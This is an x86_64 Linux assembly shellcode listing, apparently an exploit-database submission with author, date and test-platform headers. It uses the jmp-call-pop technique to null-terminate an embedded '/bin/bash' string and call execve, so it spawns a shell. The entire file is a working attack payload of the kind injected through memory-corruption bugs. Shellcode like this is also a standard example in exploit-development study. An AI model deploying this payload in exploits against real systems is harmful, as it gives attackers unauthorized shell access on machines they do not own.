
;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/bash using jump call pop
;Author: Vishav Bansal
;Github: https://github.com/vishav26
;Date: 01/08/2019
;Architecture: Linux x86_64
;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

global _start

section .text

_start:
	jmp find_address

shellcode:
	xor rax,rax
	;load rdi with the string address
	pop rdi
	;move 0 to 9th byte
	mov [rdi +9], byte ah
	mov [rdi +10], rax
	mov [rdi +18], rax

	lea rsi, [rdi +10]
	lea rdx, [rdi +18]
	mov al, 59
	syscall

find_address:
	call shellcode
	db "/bin/bashABBBBBBBBCCCCCCCC"
